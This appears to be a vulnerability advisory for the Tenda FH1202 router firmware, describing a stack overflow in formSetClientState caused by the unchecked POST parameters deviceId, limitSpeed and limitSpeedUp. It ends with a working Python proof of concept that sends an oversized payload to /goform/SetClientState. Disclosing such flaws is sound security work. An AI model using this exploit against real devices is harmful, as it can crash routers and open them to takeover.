## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `formSetClientState` function. The `v3, v5, v4` variable receives the `deviceId, limitSpeed, limitSpeedUp` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `deviceId, limitSpeed, limitSpeedUp` can trigger this security vulnerability.

![image-20240319230856245](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230856245.png)

![image-20240319230816679](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230816679.png)

![image-20240319230832735](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230832735.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetClientState"
payload = b"a"*1000

data = {'limitEn':1,"deviceId": payload}
# data = {'limitEn':1,"limitSpeed": payload}
# data = {'limitEn':1,"limitSpeedUp": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319230908380](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230908380.png)
